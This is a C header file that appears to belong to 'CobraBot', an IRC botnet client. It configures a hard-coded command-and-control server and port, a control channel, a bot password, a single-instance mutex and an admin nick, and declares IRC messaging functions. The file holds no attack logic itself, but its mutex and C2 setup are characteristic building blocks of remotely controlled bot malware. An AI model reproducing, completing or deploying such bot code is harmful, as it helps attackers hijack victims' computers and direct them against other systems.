#ifndef COBRABOT_H_INCLUDED
#define COBRABOT_H_INCLUDED

#define BOT_MUTEX		"19819uhk97hh"
#define IRC_HOST		"xiii.sytes.net"
#define IRC_PORT		6667
#define BOT_VERSION 	"CobraBot, Version 1.1"

#define	BOT_PASSWORD		"1234567"
#define IRC_CHANNEL			"#CobraBoT"

#define MAXNICKLEN		30
#define MAXLOGINS		2
#define FLOOD_DELAY		2000
#define MAX_LINES		500
#define IRCLINE			512
#define MAX_FILEPATH	1024
#define MAX_BUFFERSIZE	4096

void irc_sendv(SOCKET sock, char *msg, ...);

extern int ConnectSocket;
extern char IRCChannel[32];
extern char UserName[32];
extern char RealName[32];
extern char BotNick[32];
extern char AdminNick[32];

#endif // COBRABOT_H_INCLUDED
